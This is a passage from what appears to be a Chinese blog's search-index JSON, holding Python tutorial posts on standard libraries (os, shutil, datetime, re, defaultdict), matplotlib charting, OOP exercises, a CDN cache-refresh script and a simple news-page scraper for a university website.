列表，以逗号分隔：&quot;)    url_list = urls_input.split(&quot;,&quot;)    # 调用多吉云API刷新 CDN 缓存    api = dogecloud_api(        &quot;/cdn/refresh/add.json&quot;, &#123;&quot;rtype&quot;: rtype, &quot;urls&quot;: json.dumps(url_list)&#125;    )    # 处理响应结果    if api[&quot;code&quot;] == 200:        print(api[&quot;data&quot;][&quot;task_id&quot;])    else:        print(&quot;API 失败：&quot; + api[&quot;msg&quot;])\n\n\n借鉴了大佬的思路以及代码\n致谢\n\nhttps://www.zxma.top/posts/9a06f4c1/\nhttps://console.dogecloud.com/\nhttps://chat.openai.com/\n\n","categories":["技术教程","多吉云"],"tags":["Python","Hexo","多吉云","CDN"]},{"title":"Python中shutil和os库的区别","url":"/posts/c846834c.html","content":"在 Python 中，shutil 和 os 都是处理文件和目录操作的核心库，但它们的职责和适用场景有所不同。以下是它们的区别及应用场景的总结：\n\nos 模块定位：提供与操作系统交互的低级接口，尤其是文件系统和进程管理。适用场景：\n\n路径操作：\n使用 os.path 处理路径拼接（join）、拆分（split）、检查存在性（exists）等。import ospath = os.path.join(&quot;dir&quot;, &quot;file.txt&quot;)  # 跨平台路径拼接\n\n\n文件和目录的基本操作：\n创建&#x2F;删除目录（mkdir, rmdir）、删除文件（remove）、重命名（rename）。\n列出目录内容（listdir）、获取文件属性（stat）。\n\n\n底层系统调用：\n修改文件权限（chmod）、切换工作目录（chdir）、执行系统命令（system）。\n\n\n\n局限：\n\n不直接支持高级文件操作（如复制目录树）。\n\n\nshutil 模块定位：提供高级文件操作（尤其是复制、移动和归档），是对 os 的补充。适用场景：\n\n复制&#x2F;移动文件或目录：\n复制文件（copy2 保留元数据）、复制目录树（copytree）。\n移动文件&#x2F;目录（move，跨设备时自动处理复制+删除）。import shutilshutil.copy2(&quot;source.txt&quot;, &quot;dest.txt&quot;)  # 复制文件并保留元数据shutil.copytree(&quot;src_dir&quot;, &quot;dst_dir&quot;)   # 递归复制目录\n\n\n归档和压缩：\n创建&#x2F;解压 ZIP、TAR 等归档文件（make_archive, unpack_archive）。\n\n\n清理目录：\n递归删除目录及其内容（rmtree，比 os.rmdir 更强大）。\n\n\n\n局限：\n\n不处理路径操作或底层系统调用（依赖 os 模块）。\n\n\n关键区别总结\n\n\n功能\nos 模块\nshutil 模块\n\n\n\n路径操作\n✅ os.path 子模块\n❌ 需依赖 os.path\n\n\n创建&#x2F;删除目录\n✅ mkdir, rmdir\n✅ rmtree（递归删除）\n\n\n删除文件\n✅ remove\n❌\n\n\n复制文件\n❌\n✅ copy, copy2\n\n\n复制目录\n❌\n✅ copytree\n\n\n移动文件&#x2F;目录\n✅ rename（有限）\n✅ move（更安全）\n\n\n归档压缩\n❌\n✅ make_archive\n\n\n系统级操作（权限&#x2F;环境）\n✅ chmod, environ\n❌\n\n\n\n如何选择？\n用 os 时：\n需要操作路径、处理单个文件&#x2F;目录、执行底层系统调用。\n\n\n用 shutil 时：\n需要递归操作（如复制目录）、归档文件或简化文件移动&#x2F;复制逻辑。\n\n\n\n常见组合：\nimport osimport shutil# 示例：复制目录并过滤文件src = &quot;project&quot;dst = &quot;backup_project&quot;if os.path.exists(dst):    shutil.rmtree(dst)  # 清理目标目录shutil.copytree(src, dst)\n\n\n5. 总结\nos 是基础工具库，侧重系统和路径的低级操作。\nshutil 是高级文件操作库，简化复杂任务（如递归复制）。根据任务复杂度选择合适的工具，二者常协同使用。\n\n","categories":["Python"],"tags":["Python"]},{"title":"Python中的datatime和time库","url":"/posts/739a905d.html","content":"在 Python 中，datetime 和 time 是两个用于处理日期和时间的常用模块，但它们的功能和用途有所不同。以下是它们的详细对比：\n\ndatetime 模块用途：提供日期和时间的组合操作（年、月、日、时、分、秒等），支持算术运算（如时间差计算）。常用类：\n\ndatetime.datetime：表示具体的日期和时间（如 2023-10-25 14:30:00）。\ndatetime.date：仅表示日期（年、月、日）。\ndatetime.time：仅表示时间（时、分、秒、微秒）。\ndatetime.timedelta：表示时间间隔（用于时间加减）。\n\n示例代码from datetime import datetime, date, time, timedelta# 当前时间now = datetime.now()print(now)  # 输出: 2023-10-25 14:30:00.123456# 创建特定日期或时间d = date(2023, 10, 25)t = time(14, 30)dt = datetime(2023, 10, 25, 14, 30)# 时间运算（加减）delta = timedelta(days=1)tomorrow = now + delta\n\n\ntime 模块用途：主要提供与时间相关的底层函数，例如获取时间戳、休眠等，不直接处理日期。常用功能：\n\ntime.time()：返回当前时间戳（秒数，从 1970 年 1 月 1 日算起）。\ntime.sleep(seconds)：让程序暂停指定秒数。\ntime.localtime()：将时间戳转换为本地时间的结构化格式（struct_time）。\ntime.strftime()：格式化时间输出。\n\n示例代码import time# 获取当前时间戳（浮点数秒数）timestamp = time.time()print(timestamp)  # 输出: 1698233400.123# 时间戳转为可读格式local_time = time.localtime(timestamp)formatted = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, local_time)print(formatted)  # 输出: 2023-10-25 14:30:00# 程序休眠time.sleep(2)  # 暂停2秒\n\n\n对比总结\n\n\n特性\ndatetime 模块\ntime 模块\n\n\n\n主要用途\n处理日期和时间的组合操作\n获取时间戳、休眠、低层时间操作\n\n\n日期支持\n是（年、月、日）\n否\n\n\n时间精度\n微秒级\n秒级\n\n\n时间运算\n支持（如 timedelta）\n不支持直接运算\n\n\n格式化输出\n通过 strftime 方法\n通过 time.strftime 函数\n\n\n典型应用场景\n日志记录、时间差计算、日期解析\n性能计时、程序休眠、简单时间戳操作\n\n\n\n如何选择？\n如果需要处理日期和时间的组合（如”2023-10-25 14:30:00”），用 datetime。\n\n如果需要高精度计时或操作时间戳（如计算代码执行时间），用 time。\n\n实际项目中，两者经常结合使用：\nfrom datetime import datetimeimport timestart_time = time.time()  # 记录开始时间戳# ...执行代码...end_time = time.time()print(f&quot;耗时: &#123;end_time - start_time&#125;秒&quot;)current_time = datetime.now()  # 获取当前完整时间\n\n","categories":["Python"],"tags":["Python"]},{"title":"Python中的map函数","url":"/posts/6bbcb18e.html","content":"Python中的map函数map() 函数是Python中的一个内置函数，用于对可迭代对象（比如列表、元组等）中的每个元素应用一个指定的函数，然后返回一个包含所有函数返回值的迭代器。它的一般语法是：\nmap(function, iterable, ...)\n\n其中：\n\nfunction 是一个函数，用于对 iterable 中的每个元素进行操作。它可以是内置的函数，也可以是自定义的函数。\niterable 是一个或多个可迭代对象，例如列表、元组等。如果提供了多个可迭代对象，map() 函数会以并行的方式对它们进行操作，即将每个可迭代对象中对应位置的元素作为参数传递给 function。\nmap() 函数会返回一个迭代器，其中包含了 function 对 iterable 中每个元素执行操作后的结果。\n\n下面是一个简单的例子，演示了如何使用 map() 函数计算列表中每个数字的平方：\nnumbers = [1, 2, 3, 4, 5]# 定义一个函数，用于计算平方def square(x):    return x ** 2# 使用 map() 函数计算平方squared_numbers = map(square, numbers)# 将迭代器转换为列表并打印结果print(list(squared_numbers))  # 输出: [1, 4, 9, 16, 25]\n\n在这个例子中，map(square, numbers) 将 numbers 列表中的每个元素都传递给 square() 函数进行计算，最终返回一个迭代器，其中包含了每个元素的平方值。\n","categories":["Python","语法"],"tags":["Python"]},{"title":"Python中的re.sub() 函数详解","url":"/posts/fe4ab0b.html","content":"re.sub() 函数是 Python 的 re 模块中用于替换字符串的函数。它功能强大，可以实现各种复杂的文本处理需求。\n语法re.sub(pattern, repl, string, count = 0, flags = 0)\n\n参数\npattern: 需要被替换的正则表达式模式。\nrepl: 替换字符串或一个函数。\nstring: 需要进行替换操作的原始字符串。\ncount (可选): 指定最大替换次数，默认为 0，表示替换所有匹配。\nflags (可选): 用于控制正则表达式的匹配方式，例如是否忽略大小写等。\n\n返回值替换后的新字符串。\n使用示例1. 使用字符串进行替换import retext = &quot;The price is 123 dollars and 45 cents.&quot;new_text = re.sub(r&#x27;\\d+&#x27;, &#x27;NUM&#x27;, text)print(new_text)  # 输出: The price is NUM dollars and NUM cents.\n\n2. 使用函数进行替换import retext = &quot;this is a test sentence.&quot;def capitalize(match):    return match.group(0).capitalize()new_text = re.sub(r&#x27;\\b\\w+\\b&#x27;, capitalize, text)print(new_text)  # 输出: This Is A Test Sentence.\n\n3. 使用捕获组进行替换import retext = &quot;Contact me at 123-456-7890 or 987-654-3210.&quot;formatted_text = re.sub(r&#x27;(\\d&#123;3&#125;)-(\\d&#123;3&#125;)-(\\d&#123;4&#125;)&#x27;, r&#x27;(\\1) \\2-\\3&#x27;, text)print(formatted_text)  # 输出: Contact me at (123) 456-7890 or (987) 654-3210.\n\n4. 结合 flags 使用import retext = &quot;Baked Beans And Spam&quot;new_text = re.sub(r&#x27;\\sAND\\s&#x27;, &#x27; &amp; &#x27;, text, flags = re.IGNORECASE)print(new_text)\n","categories":["编程"],"tags":["Python","正则表达式"]},{"title":"Python中的defaultdict库","url":"/posts/d3508373.html","content":"defaultdict 是 Python 标准库 collections 模块中的一个类，它是内置 dict 类型的子类，提供了一种在字典中处理缺失键的便捷方式。\n基本概念defaultdict 与普通字典(dict)的主要区别在于：当你尝试访问一个不存在的键时，它会自动创建这个键并用一个默认值初始化，而不是像普通字典那样抛出 KeyError 异常。\n基本用法from collections import defaultdict\n\n初始化defaultdict 需要一个可调用对象作为参数，这个可调用对象会在需要时提供默认值：\ndd = defaultdict(int)  # 默认值为0dd = defaultdict(list)  # 默认值为空列表[]dd = defaultdict(set)   # 默认值为空集合set()dd = defaultdict(str)   # 默认值为空字符串&quot;&quot;\n\n示例示例 1：统计单词出现次数\nfrom collections import defaultdictword_counts = defaultdict(int)for word in [&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;apple&#x27;, &#x27;orange&#x27;]:    word_counts[word] += 1print(word_counts)# 输出: defaultdict(&lt;class &#x27;int&#x27;&gt;, &#123;&#x27;apple&#x27;: 2, &#x27;banana&#x27;: 1, &#x27;orange&#x27;: 1&#125;)\n\n示例 2：创建字母到单词的映射\nfrom collections import defaultdictwords_by_letter = defaultdict(list)words = [&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;orange&#x27;, &#x27;pear&#x27;]for word in words:    first_letter = word[0]    words_by_letter[first_letter].append(word)print(words_by_letter)# 输出: defaultdict(&lt;class &#x27;list&#x27;&gt;, &#123;&#x27;a&#x27;: [&#x27;apple&#x27;], &#x27;b&#x27;: [&#x27;banana&#x27;], &#x27;o&#x27;: [&#x27;orange&#x27;], &#x27;p&#x27;: [&#x27;pear&#x27;]&#125;)\n\n自定义默认值工厂你可以使用任何可调用对象作为默认值工厂，包括 lambda 函数：\ndd = defaultdict(lambda: &#x27;unknown&#x27;)dd[&#x27;name&#x27;] = &#x27;Alice&#x27;print(dd[&#x27;name&#x27;])  # 输出: Aliceprint(dd[&#x27;age&#x27;])   # 输出: unknown\n\n与普通字典的区别\n处理缺失键：\n\ndict：访问不存在的键会引发 KeyError\ndefaultdict：自动创建键并赋予默认值\n\n\n初始化：\n\ndict：不需要初始化函数\ndefaultdict：必须提供默认值工厂函数\n\n\n\n注意事项\n使用 defaultdict 时，KeyError 异常会被静默处理，这有时可能掩盖程序中的逻辑问题\n当需要检查键是否存在时，defaultdict 的行为可能与预期不同\n序列化时，defaultdict 的默认工厂函数不会被保存\n\n实际应用场景\n计数和聚合操作\n构建多值字典（一个键对应多个值）\n图算法中的邻接表表示\n需要避免频繁检查键是否存在的场景\n\ndefaultdict 是 Python 中一个非常有用的工具，可以简化许多涉及字典的常见编程模式，使代码更加简洁和高效。\n","categories":["Python"],"tags":["Python"]},{"title":"Python中的tuple函数","url":"/posts/249dac9b.html","content":"Python中的tuple函数在Python中，tuple() 函数是一个内置函数，用于将序列或可迭代对象转换为元组。它的语法是：\ntuple(iterable)\n\n其中 iterable 可以是一个序列（如列表或字符串）或者任何可迭代对象（如另一个元组）。tuple() 函数会将提供的可迭代对象中的元素按照其顺序转换为一个新的元组。\n以下是一些示例说明 tuple() 函数的使用：\n# 将列表转换为元组list1 = [1, 2, 3, 4, 5]tuple1 = tuple(list1)print(tuple1)  # 输出: (1, 2, 3, 4, 5)# 将字符串转换为元组string = &quot;hello&quot;tuple2 = tuple(string)print(tuple2)  # 输出: (&#x27;h&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;)# 将另一个元组转换为元组（实际上是创建了一个新的元组）tuple3 = tuple((7, 8, 9))print(tuple3)  # 输出: (7, 8, 9)\n\ntuple() 函数的作用是不可变序列的创建。元组是一种不可变的数据结构，一旦创建就无法修改。因此，当你需要一个不可变的数据结构来存储一组元素时，可以使用元组，并且 tuple() 函数提供了一种方便的方法来创建元组。\n","categories":["Python","语法"],"tags":["Python"]},{"title":"Python中的列表推导式","url":"/posts/b46ab514.html","content":"Python 中的列表推导式列表推导式是一种用来简洁地创建列表的方法，在 Python 中有几种写法。以下是常见的列表推导式写法：\n\n基本形式：\n基本形式的列表推导式由一个表达式和一个可迭代对象组成。对于可迭代对象中的每个元素，表达式都会被应用，并将结果添加到新列表中。\n例子：\n# 将列表中的每个元素加1生成新的列表original_list = [1, 2, 3, 4, 5]new_list = [x + 1 for x in original_list]print(new_list)  # 输出: [2, 3, 4, 5, 6]\n\n带有条件判断的形式：\n带有条件判断的列表推导式在基本形式的基础上添加了一个条件表达式。只有当条件为真时，才会应用表达式并将结果添加到新列表中。\n例子：\n# 将列表中大于3的元素加1生成新的列表original_list = [1, 2, 3, 4, 5]new_list = [x + 1 for x in original_list if x &gt; 3]print(new_list)  # 输出: [5, 6]\n\n多重循环的形式：\n多重循环的列表推导式包含多个 for 子句，用于迭代多个可迭代对象的元素，并生成新列表。\n例子：\n# 生成两个列表的笛卡尔积list1 = [&#x27;a&#x27;, &#x27;b&#x27;]list2 = [1, 2]cartesian_product = [(x, y) for x in list1 for y in list2]print(cartesian_product)  # 输出: [(&#x27;a&#x27;, 1), (&#x27;a&#x27;, 2), (&#x27;b&#x27;, 1), (&#x27;b&#x27;, 2)]\n\n带有条件判断和多重循环的形式：\n在多重循环的基础上，带有条件判断的列表推导式可以在每个循环中添加条件表达式，以过滤元素。\n例子：\n# 生成列表中每个元素的平方，但只保留偶数的平方original_list = [1, 2, 3, 4, 5]new_list = [x ** 2 for x in original_list if x % 2 == 0]print(new_list)  # 输出: [4, 16]\n\n嵌套列表推导式：\n嵌套列表推导式允许在一个列表推导式中嵌套另一个列表推导式，用于生成嵌套列表。\n例子：\n# 生成一个包含两个子列表的嵌套列表outer_list = [[1, 2, 3], [4, 5, 6]]flattened_list = [x for sublist in outer_list for x in sublist]print(flattened_list)  # 输出: [1, 2, 3, 4, 5, 6]\n\n","categories":["Python","语法"],"tags":["Python"]},{"title":"Python实现九宫格切割图片","url":"/posts/3d80d4a2.html","content":"克隆本项目git clone https://github.com/W1ndys/1to9-image.git\n\n然后可以看到项目文件夹\n\n使用方法\n把需要分割的图片复制进文件夹并且命名为 input_image.jpg\n在当前目录进命令行执行 python 1.py\n看到输出回显之后找 output文件夹就行\n\n注意本项目适用于长宽一致的正方形图片，分割最佳效果\n其余比例不适合使用本项目\n非常适合朋友圈九宫格切图\n","categories":["学习笔记","Python"],"tags":["Python小工具","Python脚本"]},{"title":"Python实验——数据分析之matplotlib","url":"/posts/f73f64dd.html","content":"代码import matplotlib.pyplot as pltimport numpy as npimport pandas as pdimport warningswarnings.filterwarnings(&quot;ignore&quot;)plt.rcParams[&quot;font.sans-serif&quot;] = [&quot;SimHei&quot;]plt.rcParams[&quot;axes.unicode_minus&quot;] = False# 绘制 y = x^2 + 2x + 1 的图像x = np.linspace(-5, 3, 100)y = x**2 + 2 * x + 1plt.plot(x, y, &quot;b--&quot;, label=&quot;$y=x^&#123;2&#125;+2x+1$&quot;)plt.axvline(x=-1, color=&quot;r&quot;, linestyle=&quot;--&quot;, linewidth=2.5)plt.xlabel(&quot;x&quot;)plt.ylabel(&quot;y&quot;)plt.legend()plt.show()# 绘制 sin(x) 和 cos(x) 的子图x = np.linspace(-3.14, 3.14, 100)y1 = np.sin(x)y2 = np.cos(x)plt.subplot(2, 1, 1)plt.plot(x, y1, &quot;b&quot;, linewidth=2.5)plt.title(&quot;$sinx$&quot;)plt.subplot(2, 1, 2)plt.plot(x, y2, &quot;r--&quot;, linewidth=2.5)plt.title(&quot;$cosx$&quot;)plt.tight_layout()plt.show()# 读取酒店数据并绘制柱状图df = pd.read_excel(&quot;酒店数据2.xlsx&quot;, index_col=0)data = df[&quot;地区&quot;].value_counts()x = data.indexy = data.valuesplt.figure(figsize=(10, 6))plt.bar(x, y, color=&quot;g&quot;)plt.title(&quot;每个地区酒店数量&quot;, fontsize=20)plt.xlabel(&quot;地区&quot;, fontsize=18)plt.ylabel(&quot;酒店数量&quot;, fontsize=18)plt.xticks(rotation=45)for a, b in zip(x, y):    plt.text(a, b + 3, b, ha=&quot;center&quot;, va=&quot;bottom&quot;, fontsize=10)plt.show()# 价格等级的柱状图和饼图data2 = df[&quot;等级&quot;].value_counts()x = data2.indexy = data2.valuesplt.figure(figsize=(10, 6))plt.bar(x, y, color=&quot;g&quot;)plt.title(&quot;各个价格等级占比&quot;, fontsize=20)plt.xlabel(&quot;价格等级&quot;, fontsize=18)plt.ylabel(&quot;酒店数量&quot;, fontsize=18)plt.xticks(rotation=45)plt.show()plt.pie(y, labels=x, autopct=&quot;%1.1f%%&quot;)plt.show()# 酒店评分的直方图plt.hist(df[&quot;评分&quot;], bins=10, edgecolor=&quot;black&quot;)plt.title(&quot;酒店评分直方图&quot;)plt.xlabel(&quot;评分&quot;)plt.ylabel(&quot;频数&quot;)plt.show()# 确保使用正确的列名来计算评分均值df[&quot;评分均值&quot;] = df.groupby(&quot;等级&quot;)[&quot;评分&quot;].transform(&quot;mean&quot;)# 按照评分均值排序sorted_df = df[[&quot;等级&quot;, &quot;评分均值&quot;]].drop_duplicates().sort_values(by=&quot;评分均值&quot;)plt.figure(figsize=(10, 6))  # 设置图片大小plt.bar(sorted_df[&quot;等级&quot;], sorted_df[&quot;评分均值&quot;], color=&quot;b&quot;)  # 绘制柱状图plt.title(&quot;每个价格等级酒店评分均值&quot;, fontsize=20)  # 设置标题plt.xlabel(&quot;等级&quot;, fontsize=18)plt.ylabel(&quot;评分均值&quot;, fontsize=18)  # 对横纵轴进行说明plt.xticks(rotation=45)  # 标签转90度plt.show()\n\n截图\n\n\n\n\n\n\n","categories":["Python"],"tags":["Python"]},{"title":"Python实验——曲阜师范大学新闻内容爬取","url":"/posts/6d67d75.html","content":"心得体会（随便说几句）核心就是利用 requests 和 BeautifulSoup 库，通过定位标签来获取新闻内容。\n其实关键点就在于定位标签，通过观察网页源码，可以发现新闻内容和标题等都是在一个个的 div 标签中，因此我们可以通过 find 方法来定位这些标签，然后通过 find_all 方法来获取所有符合条件的标签。\n灵活运用 print 语句，方便调试，慢慢就写出来了。\n还有个问题就是，获取到的链接是形如 ../ 的相对链接，需要进行转换再进行拼接，可以用切片或者 replace 方法来实现。\n还遇到一个问题就是，浏览器 F12 看到的标签和网页源码中的标签有时候会不一致，这里需要 print 调试才能找到正确的标签。\n源码import requestsfrom bs4 import BeautifulSoupdef scrape_news(url):    response = requests.get(url)    response.encoding = &quot;utf-8&quot;    soup = BeautifulSoup(response.text, &quot;html.parser&quot;)    # 定位body    body = soup.body    if body is not None:        # 定位div        div = body.find(&quot;div&quot;, class_=&quot;wrap&quot;)        if div is not None:            # 定位div            div_container = div.find(&quot;div&quot;, class_=&quot;container clearfix&quot;)            if div_container is not None:                # 定位li                div_pull_right = div_container.find(                    &quot;div&quot;, class_=&quot;pull-right list-right&quot;                )                if div_pull_right is not None:                    # 定位lb-ul                    lb_ul = div_pull_right.find(&quot;ul&quot;, class_=&quot;lb-ul&quot;)                    if lb_ul is not None:                        # 定位li                        li = lb_ul.find_all(&quot;li&quot;)                        result = &quot;&quot;                        for item in li:                            title = item.find(&quot;div&quot;, class_=&quot;lb-ul-tt txt-elise&quot;).text                            date = item.find(&quot;div&quot;, class_=&quot;lb-ul-date&quot;).text                            content = item.find(&quot;div&quot;, class_=&quot;lb-ul-p&quot;).text                            link = item.find(&quot;a&quot;, class_=&quot;clearfix img-hide&quot;).get(                                &quot;href&quot;                            )                            link = (                                f&quot;https://www.qfnu.edu.cn&#123;link[2:].replace(&quot;../&quot;, &quot;&quot;)&#125;&quot;                            )                            result += f&quot;标题: &#123;title&#125;\\n日期: &#123;date&#125;\\n内容: &#123;content&#125;\\n链接: &#123;link&#125;\\n\\n&quot;                        return result                    else:                        print(f&quot;未找到 class 为 &#x27;lb-ul&#x27; 的 ul，获取到的值是：&#123;lb_ul&#125;&quot;)                        return                else:                    print(                        f&quot;未找到 class 为 &#x27;pull-right list-right&#x27; 的 div，获取到的值是：&#123;div_pull_right&#125;&quot;                    )                    return            else:                print(                    f&quot;未找到 class 为 &#x27;container clearfix&#x27; 的 div，获取到的值是：&#123;div_container&#125;&quot;                )                return        else:            print(f&quot;未找到 class 为 &#x27;wrap&#x27; 的 div，获取到的值是：&#123;div&#125;&quot;)            return    else:        print(f&quot;未找到 body，获取到的值是：&#123;body&#125;&quot;)        return# 获取新闻页数def get_news_page_count(url):    response = requests.get(url)    response.encoding = &quot;utf-8&quot;    soup = BeautifulSoup(response.text, &quot;html.parser&quot;)    # 定位body    body = soup.body    if body is not None:        # 定位div        div = body.find(&quot;div&quot;, class_=&quot;wrap&quot;)        if div is not None:            # 定位div            div_container = div.find(&quot;div&quot;, class_=&quot;container clearfix&quot;)            if div_container is not None:                # 定位div                div_pull_right = div_container.find(                    &quot;div&quot;, class_=&quot;pull-right list-right&quot;                )                # print(div_pull_right)                if div_pull_right is not None:                    # 定位div                    div_page_box = div_pull_right.find(                        &quot;div&quot;, class_=&quot;page-box text-center wow fadeInUp&quot;                    )                    if div_page_box is not None:                        div_pb_sys_common = div_page_box.find(                            &quot;div&quot;, class_=&quot;pb_sys_common&quot;                        )                        if div_pb_sys_common is not None:                            span_p_pages = div_pb_sys_common.find(                                &quot;span&quot;, class_=&quot;p_pages&quot;                            )                            if span_p_pages is not None:                                span_p_no = span_p_pages.find(&quot;span&quot;, class_=&quot;p_no&quot;)                                if span_p_no is not None:                                    a = span_p_no.find(&quot;a&quot;)                                    if a is not None:                                        return int(                                            a.get(&quot;href&quot;)                                            .replace(&quot;.htm&quot;, &quot;&quot;)                                            .replace(&quot;xxyw/&quot;, &quot;&quot;)                                        )                        else:                            print(                                f&quot;未找到 class 为 &#x27;pb_sys_common&#x27; 的 div，获取到的值是：&#123;div_pb_sys_common&#125;&quot;                            )                            return 0                    else:                        print(                            f&quot;未找到 class 为 &#x27;page-box text-center wow fadeInUp animated&#x27; 的 div，获取到的值是：&#123;div_page_box&#125;&quot;                        )                        return 0                else:                    print(                        f&quot;未找到 class 为 &#x27;pull-right list-right&#x27; 的 div，获取到的值是：&#123;div_pull_right&#125;&quot;                    )                    return 0            else:                print(                    f&quot;未找到 class 为 &#x27;container clearfix&#x27; 的 div，获取到的值是：&#123;div_container&#125;&quot;                )                return 0        else:            print(f&quot;未找到 class 为 &#x27;wrap&#x27; 的 div，获取到的值是：&#123;div&#125;&quot;)            return 0    else:        print(f&quot;未找到 body，获取到的值是：&#123;body&#125;&quot;)        return 0# 保存为txtdef save_to_txt(data, filename):    with open(filename, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:        f.write(data)print(&quot;即将开始爬取新闻首页&quot;)news_index = scrape_news(&quot;https://www.qfnu.edu.cn/news/xxyw.htm&quot;)save_to_txt(news_index, &quot;news_index.txt&quot;)print(&quot;新闻首页爬取完成&quot;)print(&quot;即将开始爬取新闻第二页及以后&quot;)page_count = get_news_page_count(&quot;https://www.qfnu.edu.cn/news/xxyw.htm&quot;)if page_count:    print(f&quot;获取到的新闻页数为：&#123;page_count&#125;&quot;)else:    print(&quot;未获取到新闻页数&quot;)    exit()if page_count &gt; 0:    for i in range(page_count, 0, -1):        print(f&quot;即将爬取第 &#123;i&#125; 页&quot;)        news = scrape_news(f&quot;https://www.qfnu.edu.cn/news/xxyw/&#123;i&#125;.htm&quot;)        save_to_txt(news, f&quot;news_&#123;i&#125;.txt&quot;)\n\n实现截图\n可以看到七百多页全爬完了，大约用了几分钟\n\n\n随便点开几个看看\n我是以一页为一个单位爬的，如果要用的话，直接 Python 脚本合并起来即可\n","categories":["Python"],"tags":["Python"]},{"title":"Python实验八——面向对象编程","url":"/posts/44cb2a.html","content":"创建类计算数学import mathclass MyMath:    def __init__(self, radius):        self.radius = radius    def circle_perimeter(self):        # 计算圆的周长        return round(2 * math.pi * self.radius, 2)    def circle_area(self):        # 计算圆的面积        return round(math.pi * self.radius**2, 2)    def sphere_surface_area(self):        # 计算球的表面积        return round(4 * math.pi * self.radius**2, 2)    def sphere_volume(self):        # 计算球的体积        return round((4 / 3) * math.pi * self.radius**3, 2)# 测试代码radius = int(input(&quot;请输入半径：&quot;))mymath = MyMath(radius)print(&quot;圆的周长:&quot;, mymath.circle_perimeter())print(&quot;圆的面积:&quot;, mymath.circle_area())print(&quot;球的表面积:&quot;, mymath.sphere_surface_area())print(&quot;球的体积:&quot;, mymath.sphere_volume())\n\n解释：\n类定义：class MyMath: 定义了一个名为 MyMath 的类，表示几何计算的数学工具。\n\n**初始化方法 __init__**：\n\n接收一个参数 radius（半径）。\n使用 self.radius = radius 将传入的 radius 参数绑定到实例属性 radius 上，供后续方法调用。\n这样，每个 MyMath 对象都可以基于特定的半径进行计算。\n\n\n\n使用示例：circle = MyMath(radius=5)  # 创建一个半径为 5 的实例\n\n\n摄氏温度华氏温度转换class Temperature:    def __init__(self, temperature):        self.temperature = temperature    def ToFahrenheit(self):        return round((self.temperature * 1.8) + 32, 2)    def ToCelsius(self):        return round((self.temperature - 32) / 1.8, 2)# 输入摄氏温度并转换为华氏温度celsius = int(input(&quot;请输入摄氏温度：&quot;))temperature = Temperature(celsius)print(f&quot;摄氏温度 = &#123;celsius&#125;，华氏温度 = &#123;temperature.ToFahrenheit()&#125;&quot;)# 输入华氏温度并转换为摄氏温度fahrenheit = int(input(&quot;请输入华氏温度：&quot;))temperature = Temperature(fahrenheit)print(f&quot;华氏温度 = &#123;fahrenheit&#125;，摄氏温度 = &#123;temperature.ToCelsius()&#125;&quot;)\n\n不多解释了，和上面一样。\n\n","categories":["Python"],"tags":["Python"]},{"title":"Python实验报告——13周习题课","url":"/posts/5060bab6.html","content":"第一题，计算圆和矩形import mathimport turtleclass Dimension:    def __init__(self, x, y):        self.x = x        self.y = y    def area(self):        pass    def draw(self):        passclass Circle(Dimension):    def __init__(self, x, y, radius):        super().__init__(x, y)        self.radius = radius    def area(self):        return math.pi * self.radius**2    def draw(self):        pass  # 不需要画圆class Rectangle(Dimension):    def __init__(self, x, y, length, width):        super().__init__(x, y)        self.length = length        self.width = width    def area(self):        return self.length * self.width    def draw(self):        turtle.penup()        turtle.goto(self.x - self.length / 2, self.y - self.width / 2)        turtle.pendown()        for _ in range(2):            turtle.forward(self.length)            turtle.left(90)            turtle.forward(self.width)            turtle.left(90)# 测试代码circle = Circle(0, 0, 50)print(f&quot;圆的半径为&#123;circle.radius&#125;圆的面积为&#123;circle.area()&#125;&quot;)rectangle = Rectangle(0, 0, 60, 40)print(f&quot;矩形的长为&#123;rectangle.length&#125;，宽为&#123;rectangle.width&#125;，面积为&#123;rectangle.area()&#125;&quot;)# 绘制矩形turtle.speed(1)rectangle.draw()turtle.done()\n\n第二题，Student 学生类class Student:    # 类变量，用于存储下一个可用的 id    _next_id = 1001    def __init__(self, name, score):        self.id = None  # id 在 prod_id 方法中分配        self.name = name        self.score = score    def prod_id(self):        # 分配 id 并自增        self.id = Student._next_id        Student._next_id += 1    def __add__(self, other):        # 重载 + 运算符，返回两个学生成绩的和        if isinstance(other, Student):            return self.score + other.score        return NotImplemented# 测试代码p1 = Student(&quot;张三&quot;, 67)p1.prod_id()print(&quot;&#123;0&#125;的id号&#123;1&#125;&quot;.format(p1.name, p1.id))p2 = Student(&quot;李四&quot;, 78)p2.prod_id()print(&quot;&#123;0&#125;的id号&#123;1&#125;&quot;.format(p2.name, p2.id))print(&quot;&#123;0&#125;和&#123;1&#125;的成绩总和为：&#123;2&#125;&quot;.format(p1.name, p2.name, p1 + p2))p3 = Student(&quot;王五&quot;, 89)p3.prod_id()print(&quot;王五的id号&quot;, p3.id)\n\n第三题，模拟猜数游戏import random# 生成1到10之间的随机数target_number = random.randint(1, 10)# 最大尝试次数max_attempts = 3for attempt in range(1, max_attempts + 1):    try:        # 提示用户输入        guess = int(input(f&quot;第&#123;attempt&#125;次输入\\n输入一个数: &quot;))        # 判断用户输入        if guess &lt; 1 or guess &gt; 10:            print(&quot;Must input an integer between 1 and 10&quot;)        elif guess &gt; target_number:            print(&quot;Too big&quot;)        elif guess &lt; target_number:            print(&quot;Too small&quot;)        else:            print(&quot;Congratulations!&quot;)            print(f&quot;The value is &#123;target_number&#125;&quot;)            break    except ValueError:        print(&quot;Must input an integer between 1 and 10&quot;)else:    print(&quot;Game over&quot;)    print(f&quot;The correct number was &#123;target_number&#125;&quot;)\n\n第四题第五题，自定义一个异常类class AgeError(Exception):    def __init__(self, age):        self.age = age    def __str__(self):        return f&quot;&#123;self.age&#125;, 年龄错误！应该在 18-60 之间&quot;def check_age():    age = int(input(&quot;输入一个年龄:&quot;))    if age &lt; 18 or age &gt; 60:        raise AgeError(age)    else:        print(&quot;正常的年龄：&quot;, age)try:    check_age()except AgeError as e:    print(e)\n\n第六题，补全程序class NumberError(Exception):    def __init__(self, data):        Exception.__init__(self, data)        self.data = data  # 【1】将传入的数据保存到实例变量中    def __str__(self):  # 重载__str__方法        return f&quot;NumberError: 非法数值 &#123;self.data&#125;&quot;  # 【2】返回错误提示信息def total(data):    total = 0    for i in data:        if i &lt; 0:            raise NumberError(i)  # 【3】抛出自定义异常        